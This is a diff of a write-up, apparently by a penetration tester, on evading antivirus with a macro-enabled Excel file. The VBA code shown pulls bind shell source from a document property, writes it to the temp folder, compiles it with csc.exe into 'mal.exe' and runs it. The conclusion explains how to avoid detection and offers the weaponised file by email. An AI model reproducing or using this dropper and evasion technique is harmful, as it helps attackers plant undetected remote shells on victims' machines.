@@ -15,7 +15,7 @@ The requirement was to bypass a note AV software installed on a client machine. 
 ###### *The logic*
 * I embedded the source code of the bind shell in the comment property of the Excel file Here the link to the MS doc: https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.tools.excel.workbook.builtindocumentproperties?view=vsto-2017 and I retrived the value in the VBA script as follows:<br>
 `var = ActiveWorkbook.BuiltinDocumentProperties(5)`<br>
-I used a file system object to write the source code of the shell to the user temp folder
+I used a file system object to write the source code of the shell to the *user temp folder*
 ```
     Dim path As String
     path = Environ("Temp")
@@ -29,10 +29,24 @@ I used a file system object to write the source code of the shell to the user te
    oFile.Write var
    oFile.Close
 ```
-* I used the same technique to get the port that is parametric and to initialize the wscript shell object<br>
+* I used the same technique to get the port, that is parametric, and to initialize the wscript shell object<br>
 ![Screenshot](screen/propxlsm.png)
 ```
-    shellObj = ActiveWorkbook.BuiltinDocumentProperties(4)`
-    wSo = CreateObject(shellObj)`
+    Dim wSo as Object
+    shellObj = ActiveWorkbook.BuiltinDocumentProperties(4)
+    wSo = CreateObject(shellObj)
 ```
+* Now we need to find a compiler on the system, I searched for the *csc.exe* since the .Net FW is installed almost on every newer Win OS and my payload is written in C#. Assuming that the full path of csc.exe is stored in the CSC variable the following will compile the source file:
+```
+    Dim exePath As String
+    exePath = """" & path & "\mal.exe" & """"
+    wSo.exec CSC & " /t:exe /out:" & exePath & " " & csPath
+```
+* Finally I executed the bind shell
+```
+wSo.exec path & "\mal.exe"
+```
+###### *Conclusion*
+The idea is to compile a payload on the victim machine in order to avoid to downlad it from somewhere since the corresponding code will rise alerts on AV software, same thing happens trying to run a cmd or a bat file. Of course you have to avoid to embedd well-known code or msfvenom since they will be detected once compiled. Be creative and code your stuff.<br>Here you download the Excel file and the source code of the bind shell, the file is encrypted and you need a password to open it, if you are good guy ;) you can drop me an email at **filobers[at]protonmail[dot]com** and I will happy to provide it<br>
 
+@salut
